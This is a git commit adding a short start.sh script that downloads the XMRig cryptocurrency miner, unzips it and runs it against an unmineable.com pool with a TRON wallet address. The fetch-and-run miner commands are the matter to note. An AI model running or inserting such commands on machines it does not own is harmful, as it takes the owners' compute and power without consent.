c9388de96011ac44f381bf355158c5b6f00a0574
dfg-0i8j <91742730+dfg-0i8j@users.noreply.github.com>
2021-10-21 11:46:14 +0600

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-msvc-win64.zip
+unzip xmrig-6.15.2-msvc-win64.zip
+xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u TRX:TVWX7AmHeUp7b34PURKSCxqAHjmre86noi.mining7sgwww -p x
